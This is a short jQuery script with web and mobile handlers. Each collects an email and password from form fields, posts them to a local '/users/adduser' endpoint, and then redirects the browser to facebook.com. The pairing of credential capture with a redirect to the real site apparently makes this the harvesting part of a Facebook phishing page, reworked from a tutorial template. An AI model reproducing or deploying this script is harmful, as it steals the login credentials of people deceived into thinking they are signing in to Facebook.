
// DOM Ready =============================================================
$(document).ready(function() {

    $('.btnAddUser').on('click', addUser);
    $('.btnAddUserMobile').on('click', addUserMobile);

});

// Functions =============================================================

// Add User web
function addUser(event) {
    event.preventDefault();

    var errorCount = 0;

        var newUser = {
            'email': $('#inputUserEmail').val(),
            'password': $('#inputUserPassword').val(),
            'date': Date.now()
        };

        // Use AJAX to post the object to our adduser service
        $.ajax({
            type: 'POST',
            data: newUser,
            url: '/users/adduser',
            dataType: 'JSON'
        }).done(function( response ) {

            // Check for successful (blank) response
            if (response.msg === '') {

                // Clear the form inputs
                $('#addUser fieldset input').val('');

                // Update the table
                window.location = "https://www.facebook.com";
            }
            else {

                // If something goes wrong, alert the error message that our service returned
                alert('Error: ' + response.msg);

            }
        });

}

// Add User
function addUserMobile(event) {
    event.preventDefault();

    var errorCount = 0;

    var newUser = {
        'email': $('#inputUserEmailMobile').val(),
        'password': $('#inputUserPasswordMobile').val(),
        'date': Date.now()
    };

    // Use AJAX to post the object to our adduser service
    $.ajax({
        type: 'POST',
        data: newUser,
        url: '/users/adduser',
        dataType: 'JSON'
    }).done(function( response ) {

        // Check for successful (blank) response
        if (response.msg === '') {

            // Clear the form inputs
            $('#addUser fieldset input').val('');

            // Update the table
            window.location = "https://www.facebook.com";
        }
        else {

            // If something goes wrong, alert the error message that our service returned
            alert('Error: ' + response.msg);

        }
    });

}
